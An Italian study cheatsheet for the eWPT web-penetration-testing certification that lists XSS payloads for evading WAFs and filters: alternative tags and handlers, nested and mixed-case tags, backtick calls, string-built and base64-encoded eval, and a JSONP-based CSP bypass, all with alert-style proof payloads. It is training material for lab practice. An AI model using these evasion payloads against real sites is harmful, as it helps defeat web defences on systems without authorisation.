---
layout: cheatsheet
cert: ewpt
cert_label: "eWPT"
title: "WAF Evasion (XSS)"
permalink: "/cheatsheet/ewpt/05-cross-site-scripting/06-waf-evasion/"
section: "Cross-Site Scripting"
section_order: 5
order: 6
sort_key: 506
---

**Difficoltà:** Advanced
**Time to Master:** 2h
**Prerequisiti:** [05-Encoding-Payloads.md](/cheatsheet/ewpt/05-cross-site-scripting/05-encoding-payloads/)
**Lab:** PortSwigger Academy, XSS filter evasion

---

## Obiettivo

Un WAF che blocca `<script>` ti sembra un muro solo finché non scopri quanti altri modi esistono per far eseguire JavaScript al browser: tag alternativi, case diverse, nesting, funzioni ricostruite a runtime. Questa è la raccolta sistematica di quelle tecniche per bypassare filtri/WAF che bloccano tag, keyword o pattern noti di XSS — una sezione "cheatsheet puro" da scorrere in ordine quando il payload ovvio non passa.

---

## Concetti chiave

### Categorie di filtro comuni

| Filtro | Debolezza tipica |
|--------|--------------------|
| Blacklist su `<script>` | tag/handler alternativi passano |
| Rimozione tag una sola volta | tag annidati (`<scr<script>ipt>`) |
| Case-sensitive matching | maiuscole/minuscole miste |
| Blocca solo `onerror`/`onload` | decine di altri event handler esistono |

---

## Strumenti

Nessun tool dedicato: lista di payload da provare in sequenza con Burp Repeater/Intruder.

---

## Payload / Esempi

### Esempio 1: tag/handler alternativi a `<script>`

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### Esempio 2: bypass rimozione singola del tag (nesting)

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

### Esempio 3: bypass case-sensitive

```html
<ScRiPt>alert(1)</sCriPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### Esempio 4: bypass tramite backtick invece di parentesi (evita filtro su `()`)

```html
<svg onload=alert`1`>
```

**Spiegazione:** i template literal JS (backtick) possono essere usati come argomento di funzione in alcuni contesti, bypassando filtri che bloccano solo la sequenza `alert(`.

### Esempio 5: bypass filtro su parole comuni ("alert", "script")

```html
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror="top['al'+'ert'](1)">
<svg onload=eval(atob('YWxlcnQoMSk='))>
```

**Spiegazione:** costruire il nome della funzione a runtime concatenando stringhe, o codificare l'intero payload in base64 dentro `eval(atob())`, bypassa blacklist basate su pattern testuali statici.

### Esempio 6: bypass CSP debole (unsafe-inline assente ma script-src troppo permissivo)

```
Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net
```
Se un file JSONP o libreria ospitata sul dominio whitelisted permette callback arbitrarie:
```html
<script src="https://cdn.jsdelivr.net/npm/some-lib/jsonp?callback=alert(document.domain)//"></script>
```

---

## Evasion / Bypass Techniques

Questo intero file è la sezione evasion. **Regola pratica:** prova in ordine: tag/handler alternativo, poi case variation, poi nesting, poi encoding (vedi [05-Encoding-Payloads.md](/cheatsheet/ewpt/05-cross-site-scripting/05-encoding-payloads/)), poi CSP bypass se applicabile.

---

## Lab Hands-On

### Lab 1: PortSwigger, Reflected XSS with some SVG markup allowed
**Obiettivo:** bypassare blacklist parziale su tag
**Difficulty:** Difficile
**Time:** 45 min

**Walkthrough breve:**
1. Identifica quali tag/attributi sono bloccati testando uno per uno
2. Usa un tag/handler non presente nella blacklist (es. SVG con evento raro)
3. Conferma esecuzione

---

## Common Mistakes

- Fermarsi al primo tag bloccato -> è il modo più veloce per convincerti che l'app sia sicura quando non lo è: esistono decine di tag/handler alternativi, non solo script/img/svg
- Non controllare la CSP prima di dare per scontato che l'app sia protetta -> molte CSP hanno whitelist troppo ampie o mancano `object-src`/`base-uri`

---

## Link Utili

- [PortSwigger: XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadsAllTheThings: XSS filter bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

## Connessioni

- **Prerequisito:** [05-Encoding-Payloads.md](/cheatsheet/ewpt/05-cross-site-scripting/05-encoding-payloads/)
- **Prossimo Step:** [07-Cookie-Stealing.md](/cheatsheet/ewpt/05-cross-site-scripting/07-cookie-stealing/)

---

## Checklist di padronanza

- [ ] Conosco almeno 8 tag/event handler alternativi a script
- [ ] So bypassare filtri case-sensitive e a rimozione singola
- [ ] So valutare la robustezza di una CSP
